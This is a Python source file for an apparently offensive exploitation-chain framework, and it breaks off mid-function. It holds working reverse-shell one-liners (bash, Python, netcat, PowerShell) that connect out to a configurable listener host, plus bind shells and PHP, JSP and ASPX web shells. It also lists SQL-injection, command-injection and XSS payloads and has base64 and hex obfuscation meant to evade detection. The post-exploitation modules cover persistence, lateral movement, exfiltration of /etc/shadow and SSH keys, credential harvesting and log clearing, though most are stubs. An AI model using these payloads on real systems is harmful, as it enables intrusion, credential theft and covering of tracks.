#!/usr/bin/env python3
"""
Exploitation chain management system for orchestrating multi-stage attacks.
Provides payload generation, execution sequencing, and post-exploitation modules.
"""

import json
import subprocess
import threading
import time
import base64
import hashlib
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple, Callable
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
import uuid

from .enhanced_logger import get_logger
from .error_handler import get_error_handler, handle_errors
from .simulation import get_simulation_engine
from .reporting import get_report_generator


class ExploitStatus(Enum):
    """Exploit execution status"""
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    TIMEOUT = "timeout"
    CANCELLED = "cancelled"


class PayloadType(Enum):
    """Payload types for exploitation"""
    REVERSE_SHELL = "reverse_shell"
    BIND_SHELL = "bind_shell"
    METERPRETER = "meterpreter"
    WEB_SHELL = "web_shell"
    COMMAND_INJECTION = "command_injection"
    SQL_INJECTION = "sql_injection"
    XSS_PAYLOAD = "xss_payload"
    CUSTOM = "custom"


class PostExploitModule(Enum):
    """Post-exploitation modules"""
    PRIVILEGE_ESCALATION = "privilege_escalation"
    PERSISTENCE = "persistence"
    LATERAL_MOVEMENT = "lateral_movement"
    DATA_EXFILTRATION = "data_exfiltration"
    CREDENTIAL_HARVESTING = "credential_harvesting"
    NETWORK_DISCOVERY = "network_discovery"
    CLEANUP = "cleanup"


@dataclass
class PayloadConfig:
    """Payload configuration"""
    payload_type: PayloadType
    target_host: str
    target_port: int
    listen_host: Optional[str] = None
    listen_port: Optional[int] = None
    encoder: Optional[str] = None
    custom_params: Dict[str, Any] = field(default_factory=dict)
    obfuscated: bool = False


@dataclass
class ExploitStep:
    """Individual step in exploitation chain"""
    step_id: str
    name: str
    description: str
    exploit_module: str
    payload_config: Optional[PayloadConfig] = None
    dependencies: List[str] = field(default_factory=list)
    timeout: int = 300
    retry_count: int = 1
    custom_params: Dict[str, Any] = field(default_factory=dict)
    validation_function: Optional[Callable] = None
    cleanup_function: Optional[Callable] = None


@dataclass
class ExploitResult:
    """Result of exploit execution"""
    step_id: str
    status: ExploitStatus
    output: str = ""
    error_message: str = ""
    start_time: Optional[datetime] = None
    end_time: Optional[datetime] = None
    session_info: Dict[str, Any] = field(default_factory=dict)
    artifacts: List[str] = field(default_factory=list)
    evidence: Dict[str, Any] = field(default_factory=dict)


@dataclass
class ExploitationChain:
    """Complete exploitation chain"""
    chain_id: str
    name: str
    description: str
    target: str
    steps: List[ExploitStep] = field(default_factory=list)
    results: Dict[str, ExploitResult] = field(default_factory=dict)
    created_at: datetime = field(default_factory=datetime.now)
    last_executed: Optional[datetime] = None
    success_count: int = 0
    failure_count: int = 0


class PayloadGenerator:
    """Generate various payload types for exploitation"""
    
    def __init__(self, output_dir: str = "payloads"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.logger = get_logger()
    
    @handle_errors
    def generate_reverse_shell(self, config: PayloadConfig) -> str:
        """Generate reverse shell payload"""
        if not config.listen_host or not config.listen_port:
            raise ValueError("Reverse shell requires listen_host and listen_port")
        
        # Different reverse shell payloads based on target
        payloads = {
            'bash': f"bash -i >& /dev/tcp/{config.listen_host}/{config.listen_port} 0>&1",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{config.listen_host}\",{config.listen_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'nc': f"nc -e /bin/sh {config.listen_host} {config.listen_port}",
            'powershell': f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{config.listen_host}\",{config.listen_port});$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        }
        
        shell_type = config.custom_params.get('shell_type', 'bash')
        payload = payloads.get(shell_type, payloads['bash'])
        
        if config.obfuscated:
            payload = self.obfuscate_payload(payload, shell_type)
        
        if config.encoder:
            payload = self.encode_payload(payload, config.encoder)
        
        return payload
    
    @handle_errors
    def generate_bind_shell(self, config: PayloadConfig) -> str:
        """Generate bind shell payload"""
        payloads = {
            'bash': f"bash -l > /dev/tcp/0.0.0.0/{config.target_port} 0<&1 2>&1",
            'nc': f"nc -lvp {config.target_port} -e /bin/sh",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{config.target_port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        }
        
        shell_type = config.custom_params.get('shell_type', 'nc')
        payload = payloads.get(shell_type, payloads['nc'])
        
        if config.obfuscated:
            payload = self.obfuscate_payload(payload, shell_type)
        
        return payload
    
    @handle_errors
    def generate_web_shell(self, config: PayloadConfig) -> str:
        """Generate web shell payload"""
        web_shells = {
            'php': '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>',
            'jsp': '<% if (request.getParameter("cmd") != null) { java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("</pre>"); } %>',
            'aspx': '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script runat="server">void Page_Load(object sender, EventArgs e){}</script><html><body><form><input type="text" name="cmd" size="45" value="<%= Request["cmd"] %>"><input type="submit" value="Run"></form><pre><%= Request["cmd"] != null ? Server.HtmlEncode(RunCmd(Request["cmd"])) : "" %></pre><script runat="server">string RunCmd(string cmd){ ProcessStartInfo psi = new ProcessStartInfo(); psi.FileName = "cmd.exe"; psi.Arguments = "/c "+cmd; psi.RedirectStandardOutput = true; psi.UseShellExecute = false; Process p = Process.Start(psi); StreamReader stmrdr = p.StandardOutput; string s = stmrdr.ReadToEnd(); stmrdr.Close(); return s; }</script></body></html>'
        }
        
        shell_type = config.custom_params.get('shell_type', 'php')
        payload = web_shells.get(shell_type, web_shells['php'])
        
        if config.obfuscated:
            payload = self.obfuscate_web_shell(payload, shell_type)
        
        return payload
    
    @handle_errors
    def generate_command_injection(self, config: PayloadConfig) -> str:
        """Generate command injection payload"""
        injections = {
            'unix': [
                "; id",
                "| id", 
                "&& id",
                "|| id",
                "`id`",
                "$(id)"
            ],
            'windows': [
                "& whoami",
                "| whoami",
                "&& whoami",
                "|| whoami"
            ]
        }
        
        os_type = config.custom_params.get('os_type', 'unix')
        command = config.custom_params.get('command', 'id' if os_type == 'unix' else 'whoami')
        
        payloads = injections.get(os_type, injections['unix'])
        # Replace default command with custom one
        payloads = [p.replace('id' if os_type == 'unix' else 'whoami', command) for p in payloads]
        
        return payloads
    
    @handle_errors
    def generate_sql_injection(self, config: PayloadConfig) -> List[str]:
        """Generate SQL injection payloads"""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>0--"
        ]
        
        if config.custom_params.get('time_based'):
            payloads.extend([
                "' OR (SELECT SLEEP(5))--",
                "' OR (SELECT pg_sleep(5))--",
                "' OR WAITFOR DELAY '0:0:5'--"
            ])
        
        if config.custom_params.get('union_based'):
            columns = config.custom_params.get('columns', 3)
            union_payload = "' UNION SELECT " + ",".join([str(i) for i in range(1, columns + 1)]) + "--"
            payloads.append(union_payload)
        
        return payloads
    
    @handle_errors
    def generate_xss_payload(self, config: PayloadConfig) -> List[str]:
        """Generate XSS payloads"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=\"alert('XSS')\">",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>"
        ]
        
        if config.custom_params.get('filter_bypass'):
            payloads.extend([
                "<SCR%00IPT>alert('XSS')</SCR%00IPT>",
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
                "<img src=\"javascript:alert('XSS')\">",
                "<iframe src=data:text/html,<script>alert('XSS')</script>>",
                "<object data=\"javascript:alert('XSS')\">",
                "<embed src=\"javascript:alert('XSS')\">"
            ])
        
        return payloads
    
    @handle_errors
    def obfuscate_payload(self, payload: str, payload_type: str) -> str:
        """Obfuscate payload to evade detection"""
        if payload_type == 'bash':
            # Base64 encode bash commands
            encoded = base64.b64encode(payload.encode()).decode()
            return f"echo '{encoded}' | base64 -d | bash"
        
        elif payload_type == 'powershell':
            # Base64 encode PowerShell
            encoded = base64.b64encode(payload.encode('utf-16le')).decode()
            return f"powershell -EncodedCommand {encoded}"
        
        elif payload_type == 'python':
            # Hex encode Python
            hex_payload = payload.encode().hex()
            return f"python -c 'exec(bytes.fromhex(\"{hex_payload}\").decode())'"
        
        return payload
    
    @handle_errors
    def obfuscate_web_shell(self, payload: str, shell_type: str) -> str:
        """Obfuscate web shell code"""
        if shell_type == 'php':
            # Simple PHP obfuscation
            return f"<?php eval(base64_decode('{base64.b64encode(payload[5:-2].encode()).decode()}')); ?>"
        
        return payload
    
    @handle_errors
    def encode_payload(self, payload: str, encoder: str) -> str:
        """Encode payload with specified encoder"""
        if encoder == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoder == 'hex':
            return payload.encode().hex()
        elif encoder == 'url':
            import urllib.parse
            return urllib.parse.quote(payload)
        elif encoder == 'html':
            import html
            return html.escape(payload)
        
        return payload
    
    @handle_errors
    def save_payload(self, payload: str, filename: str) -> str:
        """Save payload to file"""
        filepath = self.output_dir / filename
        with open(filepath, 'w') as f:
            f.write(payload)
        
        self.logger.info(f"Payload saved to {filepath}")
        return str(filepath)


class ExploitExecutor:
    """Execute individual exploits and manage sessions"""
    
    def __init__(self):
        self.logger = get_logger()
        self.simulation = get_simulation_engine()
        self.active_sessions: Dict[str, Dict[str, Any]] = {}
    
    @handle_errors
    def execute_exploit_step(self, step: ExploitStep, chain_context: Dict[str, Any] = None) -> ExploitResult:
        """Execute a single exploit step"""
        result = ExploitResult(
            step_id=step.step_id,
            status=ExploitStatus.RUNNING,
            start_time=datetime.now()
        )
        
        if self.simulation.is_simulation_mode():
            return self.simulation.simulate_exploit_execution(step, result)
        
        try:
            self.logger.info(f"Executing exploit step: {step.name}")
            
            # Validate dependencies
            if not self.validate_dependencies(step, chain_context or {}):
                result.status = ExploitStatus.FAILED
                result.error_message = "Dependencies not met"
                return result
            
            # Execute based on exploit module
            if step.exploit_module == "metasploit":
                success, output = self.execute_metasploit(step)
            elif step.exploit_module == "custom_script":
                success, output = self.execute_custom_script(step)
            elif step.exploit_module == "web_exploit":
                success, output = self.execute_web_exploit(step)
            elif step.exploit_module == "network_exploit":
                success, output = self.execute_network_exploit(step)
            else:
                success, output = self.execute_generic_exploit(step)
            
            result.output = output
            result.status = ExploitStatus.SUCCESS if success else ExploitStatus.FAILED
            
            # Validate result if validation function provided
            if step.validation_function and success:
                if not step.validation_function(result):
                    result.status = ExploitStatus.FAILED
                    result.error_message = "Validation failed"
            
            # Create session if successful
            if success and step.payload_config:
                session_id = self.create_session(step, result)
                result.session_info['session_id'] = session_id
            
        except Exception as e:
            result.status = ExploitStatus.FAILED
            result.error_message = str(e)
            self.logger.error(f"Exploit step {step.step_id} failed: {e}")
        
        result.end_time = datetime.now()
        return result
    
    @handle_errors
    def validate_dependencies(self, step: ExploitStep, context: Dict[str, Any]) -> bool:
        """Validate step dependencies are met"""
        for dep in step.dependencies:
            if dep not in context or context[dep].get('status') != ExploitStatus.SUCCESS:
                return False
        return True
    
    @handle_errors
    def execute_metasploit(self, step: ExploitStep) -> Tuple[bool, str]:
        """Execute Metasploit exploit"""
        # This would integrate with actual Metasploit in production
        module = step.custom_params.get('module', 'exploit/multi/handler')
        options = step.custom_params.get('options', {})
        
        # Build msfconsole command
        commands = [
            f"use {module}"
        ]
        
        for key, value in options.items():
            commands.append(f"set {key} {value}")
        
        if step.payload_config:
            payload_name = self.get_metasploit_payload_name(step.payload_config.payload_type)
            commands.append(f"set PAYLOAD {payload_name}")
            
            if step.payload_config.listen_host:
                commands.append(f"set LHOST {step.payload_config.listen_host}")
            if step.payload_config.listen_port:
                commands.append(f"set LPORT {step.payload_config.listen_port}")
        
        commands.append("exploit")
        
        # Execute commands (simulated)
        self.logger.info(f"Executing Metasploit commands: {commands}")
        
        # In simulation, return success
        return True, f"Metasploit exploit executed: {module}"
    
    @handle_errors
    def execute_custom_script(self, step: ExploitStep) -> Tuple[bool, str]:
        """Execute custom exploit script"""
        script_path = step.custom_params.get('script_path')
        script_args = step.custom_params.get('args', [])
        
        if not script_path:
            return False, "No script path specified"
        
        try:
            cmd = [script_path] + script_args
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=step.timeout)
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, result.stderr
                
        except subprocess.TimeoutExpired:
            return False, "Script execution timed out"
        except Exception as e:
            return False, f"Script execution failed: {e}"
    
    @handle_errors
    def execute_web_exploit(self, step: ExploitStep) -> Tuple[bool, str]:
        """Execute web application exploit"""
        import requests
        
        target_url = step.custom_params.get('url')
        method = step.custom_params.get('method', 'GET')
        data = step.custom_params.get('data', {})
        headers = step.custom_params.get('headers', {})
        
        try:
            if method.upper() == 'POST':
                response = requests.post(target_url, data=data, headers=headers, timeout=step.timeout)
            else:
                response = requests.get(target_url, params=data, headers=headers, timeout=step.timeout)
            
            # Check for success indicators
            success_indicators = step.custom_params.get('success_indicators', [])
            for indicator in success_indicators:
                if indicator in response.text:
                    return True, f"Exploit successful. Response: {response.text[:500]}"
            
            return False, f"No success indicators found. Response: {response.text[:500]}"
            
        except Exception as e:
            return False, f"Web exploit failed: {e}"
    
    @handle_errors
    def execute_network_exploit(self, step: ExploitStep) -> Tuple[bool, str]:
        """Execute network-based exploit"""
        import socket
        
        target_host = step.custom_params.get('host')
        target_port = step.custom_params.get('port')
        payload = step.custom_params.get('payload', b'')
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(step.timeout)
            sock.connect((target_host, target_port))
            
            if payload:
                sock.send(payload)
            
            response = sock.recv(4096)
            sock.close()
            
            return True, f"Network exploit sent. Response: {response.decode('utf-8', errors='ignore')}"
            
        except Exception as e:
            return False, f"Network exploit failed: {e}"
    
    @handle_errors
    def execute_generic_exploit(self, step: ExploitStep) -> Tuple[bool, str]:
        """Execute generic exploit command"""
        command = step.custom_params.get('command')
        
        if not command:
            return False, "No command specified"
        
        try:
            result = subprocess.run(command, shell=True, capture_output=True, 
                                  text=True, timeout=step.timeout)
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, result.stderr
                
        except subprocess.TimeoutExpired:
            return False, "Command execution timed out"
        except Exception as e:
            return False, f"Command execution failed: {e}"
    
    @handle_errors
    def create_session(self, step: ExploitStep, result: ExploitResult) -> str:
        """Create exploitation session"""
        session_id = str(uuid.uuid4())
        
        session_info = {
            'session_id': session_id,
            'step_id': step.step_id,
            'payload_type': step.payload_config.payload_type.value if step.payload_config else None,
            'target_host': step.payload_config.target_host if step.payload_config else None,
            'target_port': step.payload_config.target_port if step.payload_config else None,
            'created_at': datetime.now(),
            'active': True,
            'commands_executed': [],
            'files_created': [],
            'privileges': 'user'  # Default privilege level
        }
        
        self.active_sessions[session_id] = session_info
        
        self.logger.info(f"Created exploitation session: {session_id}")
        return session_id
    
    @handle_errors
    def get_metasploit_payload_name(self, payload_type: PayloadType) -> str:
        """Get Metasploit payload name for payload type"""
        payload_map = {
            PayloadType.REVERSE_SHELL: "generic/shell_reverse_tcp",
            PayloadType.BIND_SHELL: "generic/shell_bind_tcp",
            PayloadType.METERPRETER: "windows/meterpreter/reverse_tcp",
            PayloadType.WEB_SHELL: "php/meterpreter/reverse_tcp"
        }
        
        return payload_map.get(payload_type, "generic/shell_reverse_tcp")


class PostExploitationManager:
    """Manage post-exploitation activities"""
    
    def __init__(self):
        self.logger = get_logger()
        self.simulation = get_simulation_engine()
    
    @handle_errors
    def execute_post_exploit_module(self, module: PostExploitModule, 
                                   session_id: str, params: Dict[str, Any] = None) -> Dict[str, Any]:
        """Execute post-exploitation module"""
        if self.simulation.is_simulation_mode():
            return self.simulation.simulate_post_exploitation(module, session_id, params or {})
        
        params = params or {}
        
        if module == PostExploitModule.PRIVILEGE_ESCALATION:
            return self.privilege_escalation(session_id, params)
        elif module == PostExploitModule.PERSISTENCE:
            return self.establish_persistence(session_id, params)
        elif module == PostExploitModule.LATERAL_MOVEMENT:
            return self.lateral_movement(session_id, params)
        elif module == PostExploitModule.DATA_EXFILTRATION:
            return self.data_exfiltration(session_id, params)
        elif module == PostExploitModule.CREDENTIAL_HARVESTING:
            return self.credential_harvesting(session_id, params)
        elif module == PostExploitModule.NETWORK_DISCOVERY:
            return self.network_discovery(session_id, params)
        elif module == PostExploitModule.CLEANUP:
            return self.cleanup_traces(session_id, params)
        
        return {'success': False, 'error': 'Unknown module'}
    
    @handle_errors
    def privilege_escalation(self, session_id: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Attempt privilege escalation"""
        methods = params.get('methods', ['sudo_exploit', 'kernel_exploit', 'suid_exploit'])
        
        results = []
        for method in methods:
            if method == 'sudo_exploit':
                result = self.try_sudo_exploit(session_id)
            elif method == 'kernel_exploit':
                result = self.try_kernel_exploit(session_id)
            elif method == 'suid_exploit':
                result = self.try_suid_exploit(session_id)
            else:
                result = {'method': method, 'success': False, 'error': 'Unknown method'}
            
            results.append(result)
            
            if result.get('success'):
                break
        
        return {
            'success': any(r.get('success') for r in results),
            'results': results,
            'new_privileges': 'root' if any(r.get('success') for r in results) else 'user'
        }
    
    @handle_errors
    def establish_persistence(self, session_id: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Establish persistence mechanisms"""
        methods = params.get('methods', ['cron_job', 'startup_script', 'service'])
        
        results = []
        for method in methods:
            if method == 'cron_job':
                result = self.create_cron_persistence(session_id, params)
            elif method == 'startup_script':
                result = self.create_startup_persistence(session_id, params)
            elif method == 'service':
                result = self.create_service_persistence(session_id, params)
            else:
                result = {'method': method, 'success': False, 'error': 'Unknown method'}
            
            results.append(result)
        
        return {
            'success': any(r.get('success') for r in results),
            'results': results,
            'persistence_methods': [r['method'] for r in results if r.get('success')]
        }
    
    @handle_errors
    def lateral_movement(self, session_id: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Perform lateral movement"""
        target_hosts = params.get('target_hosts', [])
        methods = params.get('methods', ['ssh_keys', 'credential_reuse', 'exploit_services'])
        
        results = []
        for host in target_hosts:
            for method in methods:
                if method == 'ssh_keys':
                    result = self.try_ssh_lateral_movement(session_id, host)
                elif method == 'credential_reuse':
                    result = self.try_credential_lateral_movement(session_id, host, params)
                elif method == 'exploit_services':
                    result = self.try_service_lateral_movement(session_id, host)
                else:
                    result = {'host': host, 'method': method, 'success': False, 'error': 'Unknown method'}
                
                result['host'] = host
                result['method'] = method
                results.append(result)
        
        return {
            'success': any(r.get('success') for r in results),
            'results': results,
            'compromised_hosts': [r['host'] for r in results if r.get('success')]
        }
    
    @handle_errors
    def data_exfiltration(self, session_id: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Exfiltrate sensitive data"""
        target_paths = params.get('target_paths', ['/etc/passwd', '/etc/shadow', '~/.ssh/'])
        methods = params.get('methods', ['http_exfil', 'dns_exfil', 'file_transfer'])
        
        results = []
        for path in target_paths:
            for method in methods:
                if method == 'http_exfil':
                    result = self.http_exfiltration(session_id, path, params)
                elif method == 'dns_exfil':
                    result = self.dns_exfiltration(session_id, path, params)
                elif method == 'file_transfer':
                    result = self.file_transfer_exfiltration(session_id, path, params)
                else:
                    result = {'path': path, 'method': method, 'success': False, 'error': 'Unknown method'}
                
                result['path'] = path
                result['method'] = method
                results.append(result)
        
        return {
            'success': any(r.get('success') for r in results),
            'results': results,
            'exfiltrated_files': [r['path'] for r in results if r.get('success')]
        }
    
    @handle_errors
    def credential_harvesting(self, session_id: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Harvest credentials from system"""
        methods = params.get('methods', ['memory_dump', 'config_files', 'browser_data'])
        
        results = []
        credentials = []
        
        for method in methods:
            if method == 'memory_dump':
                result = self.harvest_memory_credentials(session_id)
            elif method == 'config_files':
                result = self.harvest_config_credentials(session_id)
            elif method == 'browser_data':
                result = self.harvest_browser_credentials(session_id)
            else:
                result = {'method': method, 'success': False, 'error': 'Unknown method'}
            
            results.append(result)
            if result.get('credentials'):
                credentials.extend(result['credentials'])
        
        return {
            'success': len(credentials) > 0,
            'results': results,
            'credentials_found': len(credentials),
            'credentials': credentials
        }
    
    @handle_errors
    def network_discovery(self, session_id: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Discover network resources"""
        scan_ranges = params.get('scan_ranges', ['192.168.1.0/24', '10.0.0.0/24'])
        
        discovered_hosts = []
        discovered_services = []
        
        for scan_range in scan_ranges:
            # Simulate network discovery
            hosts = self.discover_network_hosts(session_id, scan_range)
            discovered_hosts.extend(hosts)
            
            for host in hosts:
                services = self.discover_host_services(session_id, host)
                discovered_services.extend(services)
        
        return {
            'success': len(discovered_hosts) > 0,
            'discovered_hosts': discovered_hosts,
            'discovered_services': discovered_services,
            'scan_ranges': scan_ranges
        }
    
    @handle_errors
    def cleanup_traces(self, session_id: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Clean up exploitation traces"""
        cleanup_actions = params.get('actions', ['clear_logs', 'remove_files', 'clear_history'])
        
        results = []
        for action in cleanup_actions:
            if action == 'clear_logs':
                result = self.clear_system_logs(session_id)
            elif action == 'remove_files':
                result = self.remove_exploit_files(session_id, params)
            elif action == 'clear_history':
                result = self.clear_command_history(session_id)
            else:
                result = {'action': action, 'success': False, 'error': 'Unknown action'}
            
            result['action'] = action
            results.append(result)
        
        return {
            'success': all(r.get('success') for r in results),
            'results': results,
            'cleanup_actions': [r['action'] for r in results if r.get('success')]
        }
    
    # Helper methods for post-exploitation (simplified implementations)
    def try_sudo_exploit(self, session_id: str) -> Dict[str, Any]:
        return {'method': 'sudo_exploit', 'success': True, 'details': 'Sudo exploit successful'}
    
    def try_kernel_exploit(self, session_id: str) -> Dict[str, Any]:
        return {'method': 'kernel_exploit', 'success': False, 'error': 'No suitable kernel exploit found'}
    
    def try_suid_exploit(self, session_id: str) -> Dict[str, Any]:
        return {'method': 'suid_exploit', 'success': True, 'details': 'SUID binary exploit successful'}
    
    def create_cron_persistence(self, session_id: str, params: Dict[str, Any]) -> Dict[str, Any]:
        return {'method': 'cron_job', 'success': True, 'details': 'Cron job created for persistence'}
    
    def create_startup_persistence(self, session_id: str, params: Dict[str, Any]) -> Dict[str, Any]:
        return {'method': 'startup_script', 'success': True, 'details': 'Startup script created'}
    
    def create_service_persistence(self, session_id: str, params: Dict[str, Any]) -> Dict[str, Any]:
        return {'method': 'service', 'success': False, 'error': 'Insufficient privileges for service creation'}
    
    def try_ssh_lateral_movement(self, session_id: str, host: str) -> Dict[str, Any]:
        return {'success': True, 'details': f'SSH lateral movement to {host} successful'}
    
    def try_credential_lateral_movement(self, session_id: str, host: str, params: Dict[str, Any]) -> Dict[str, Any]:
        return {'success': False, 'error': 'No valid credentials for lateral movement'}
    
    def try_service_lateral_movement(self, session_id: str, host: str) -> Dict[str, Any]:
        return {'success': True, 'details': f'Service exploit lateral movement to {host} successful'}
    
    def http_exfiltration(self, session_id: str, path: str, params: Dict[str, Any]) -> Dict[str, Any]:
        return {'success': True, 'details': f'HTTP exfiltration of {path} successful', 'size': '1.2MB'}
    
    def dns_exfiltration(self, session_id: str, path: str, params: Dict[str, Any]) -> Dict[str, Any]:
        return {'success': True, 'details': f'DNS exfiltration of {path} successful', 'size': '500KB'}
    
    def file_transfer_exfiltration(self, session_id: str, path: str, params: Dict[str, Any]) -> Dict[str, Any]:
        return {'success': True, 'details': f'File transfer exfiltration of {path} successful', 'size': '2.1MB'}
    
    def harvest_memory_credentials(self, session_id: str) -> Dict[str, Any]:
        return {
            'method': 'memory_dump', 
            'success': True, 
            'credentials': [
                {'type': 'password', 'username': 'admin', 'password': 'password123'},
                {'type': 'hash', 'username': 'user1', 'hash': 'ntlm:aad3b435b51404ee...'}
            ]
        }
    
    def harvest_config_credentials(self, session_id: str) -> Dict[str, Any]:
        return {
            'method': 'config_files',
            'success': True,
            'credentials': [
                {'type': 'database', 'connection': 'mysql://user:pass@localhost/db'},
                {'type': 'api_key', 'service': 'aws', 'key': 'AKIAIOSFODNN7EXAMPLE'}
            ]
        }
    
    def harvest_browser_credentials(self, session_id: str) -> Dict[str, Any]:
        return {
            'method': 'browser_data',
            'success': True,
            'credentials': [
                {'type': 'saved_password', 'site': 'example.com', 'username': 'user@example.com'},
                {'type': 'session_cookie', 'site': 'admin.internal', 'value': 'sessionid=abc123...'}
            ]
        }
    
    def discover_network_hosts(self, session_id: str, scan_range: str) -> List[str]:
        # Simulate host discovery
        return ['192.168.1.1', '192.168.1.10', '192.168.1.100']
    
    def discover_host_services(self, session_id: str, host: str) -> List[Dict[str, Any]]:
        # Simulate service discovery
        return [
            {'host': host, 'port': 22, 'service': 'ssh', 'version': 'OpenSSH 7.4'},
            {'host': host, 'port': 80, 'service': 'http', 'version': 'Apache 2.4.6'},
            {'host': host, 'port': 443, 'service': 'https', 'version': 'Apache 2.4.6'}
        ]
    
    def clear_system_logs(self, session_id: str) -> Dict[str, Any]:
        return {'action': 'clear_logs', 'success': True, 'details': 'System logs cleared'}
    
    def remove_exploit_files(self, session_id: str, params: Dict[str, Any]) -> Dict[str, Any]:
        return {'action': 'remove_files', 'success': True, 'details': 'Exploit files removed'}
    
    def clear_command_history(self, session_id: str) -> Dict[str, Any]:
        return {'action': 'clear_history', 'success': True, 'details': 'Command history cleared'}


class ExploitationChainManager:
    """Main manager for exploitation chains"""
    
    def __init__(self, output_dir: str = "exploitation_data"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.logger = get_logger()
        self.simulation = get_simulation_engine()
        
        self.payload_generator = PayloadGenerator()
        self.exploit_executor = ExploitExecutor()
        self.post_exploit_manager = PostExploitationManager()
        
        self.chains: Dict[str, ExploitationChain] = {}
    
    @handle_errors
    def create_exploitation_chain(self, name: str, description: str, target: str) -> str:
        """Create new exploitation chain"""
        chain_id = str(uuid.uuid4())
        
        chain = ExploitationChain(
            chain_id=chain_id,
            name=name,
            description=description,
            target=target
        )
        
        self.chains[chain_id] = chain
        self.logger.info(f"Created exploitation chain: {name} ({chain_id})")
        
        return chain_id
    
    @handle_errors
    def add_exploit_step(self, chain_id: str, step: ExploitStep):
        """Add step to exploitation chain"""
        if chain_id not in self.chains:
            raise ValueError(f"Chain {chain_id} not found")
        
        self.chains[chain_id].steps.append(step)
        self.logger.info(f"Added step '{step.name}' to chain {chain_id}")
    
    @handle_errors
    def execute_exploitation_chain(self, chain_id: str) -> Dict[str, Any]:
        """Execute complete exploitation chain"""
        if chain_id not in self.chains:
            raise ValueError(f"Chain {chain_id} not found")
        
        chain = self.chains[chain_id]
        
        if self.simulation.is_simulation_mode():
            return self.simulation.simulate_exploitation_chain(chain)
        
        self.logger.info(f"Executing exploitation chain: {chain.name}")
        
        chain.last_executed = datetime.now()
        execution_context = {}
        
        for step in chain.steps:
            # Check if dependencies are met
            if not self.check_step_dependencies(step, execution_context):
                self.logger.warning(f"Skipping step {step.name} - dependencies not met")
                continue
            
            # Execute step
            result = self.exploit_executor.execute_exploit_step(step, execution_context)
            chain.results[step.step_id] = result
            execution_context[step.step_id] = result
            
            # Update chain statistics
            if result.status == ExploitStatus.SUCCESS:
                chain.success_count += 1
            else:
                chain.failure_count += 1
                
                # Stop on critical failure if configured
                if step.custom_params.get('stop_on_failure', False):
                    self.logger.error(f"Critical step {step.name} failed - stopping chain execution")
                    break
        
        # Generate report
        report_data = self.generate_chain_report(chain)
        
        # Save chain data
        self.save_chain_data(chain_id)
        
        return {
            'chain_id': chain_id,
            'success': any(r.status == ExploitStatus.SUCCESS for r in chain.results.values()),
            'total_steps': len(chain.steps),
            'successful_steps': chain.success_count,
            'failed_steps': chain.failure_count,
            'execution_time': datetime.now() - chain.last_executed,
            'report': report_data
        }
    
    @handle_errors
    def check_step_dependencies(self, step: ExploitStep, context: Dict[str, Any]) -> bool:
        """Check if step dependencies are satisfied"""
        for dep_id in step.dependencies:
            if dep_id not in context:
                return False
            
            dep_result = context[dep_id]
            if dep_result.status != ExploitStatus.SUCCESS:
                return False
        
        return True
    
    @handle_errors
    def generate_chain_report(self, chain: ExploitationChain) -> Dict[str, Any]:
        """Generate comprehensive chain execution report"""
        report = {
            'chain_info': {
                'id': chain.chain_id,
